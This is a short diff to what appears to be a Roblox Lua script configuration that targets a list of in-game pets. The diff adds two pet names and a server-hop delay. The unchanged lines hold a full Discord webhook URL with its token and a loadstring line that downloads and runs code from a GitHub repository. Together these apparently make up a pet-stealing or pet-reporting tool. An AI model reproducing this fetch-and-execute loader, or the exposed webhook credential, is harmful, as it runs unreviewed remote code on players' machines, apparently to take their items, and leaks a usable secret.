@@ -1,8 +1,11 @@
 Pets = {
+    "Disco Bee",
+    "Butterfly",
     "Queen Bee",
     "Raccoon",
     "Dragonfly",
     "Red Fox"
 }
 Webhook = "https://discord.com/api/webhooks/1369357292650106890/XBpcPKBDldoTN1urLBU3uhQHF-7KT7uGkBHDbZbnJ3zCeyOU9TATx6v8Cl8gemx37fcW"
+DelayBeforeHop = 0
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/PetSelector/refs/heads/main/GaG"))()
